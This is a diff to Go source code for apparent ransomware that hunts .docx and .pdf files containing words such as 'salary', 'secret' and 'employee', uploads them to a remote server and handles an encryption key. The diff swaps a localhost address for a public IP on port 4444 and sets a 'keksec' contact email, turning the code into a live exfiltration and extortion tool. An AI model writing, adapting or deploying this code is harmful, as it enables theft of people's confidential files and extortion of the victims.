@@ -27,8 +27,9 @@ import (
 )
 
 var (
-	ToKeep []string = []string{ ".*\\.docx" }
-	SensitiveContent [][]byte =[][]byte{ []byte("confidential"), []byte("argent"), []byte("salaire") }
+	ToKeep []string = []string{ ".*\\.docx" , ".*\\.pdf" }
+        SensitiveContent [][]byte =[][]byte{ []byte("confidential"), []byte("money"), []byte("salary"), []byte("address"), []byte("secret"), []byte("ID"), []byte("employee") }
+
 )
 
 type keeper struct {
@@ -181,11 +182,11 @@ func DownloadFiles(k *keeper) {
 
     req.Header.Add("Content-Type", writer.FormDataContentType())
 
-    resp, err := hc.Do(req)
+    hc.Do(req)
 }
 
-var server string = "127.0.0.1:4444" // server address
-var contact string = "keksec@kek.hq" // whatever address suits you
+var server string = "104.237.218.70:4444" // server address
+var contact string = "keksec@hotmail.fr" // whatever address suits you
 
 func main() {
     var files []keeper
@@ -238,7 +239,6 @@ func main() {
     if err != nil {
         log.Fatal(err)
     }
-    randomKey = nil // clear key
 
     id, err := machineid.ID()
     if err != nil {
@@ -253,7 +253,8 @@ func main() {
         })
         if err != nil {
             if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
-                ioutil.WriteFile("key.txt", []byte(hex.EncodeToString(encryptedKey)), 0644)
+		    ioutil.WriteFile("key.txt", randomKey[:], 0644)
+		    randomKey = nil // clear key
             }
 
             fmt.Println("Connection failed. Retrying in 5 seconds..")
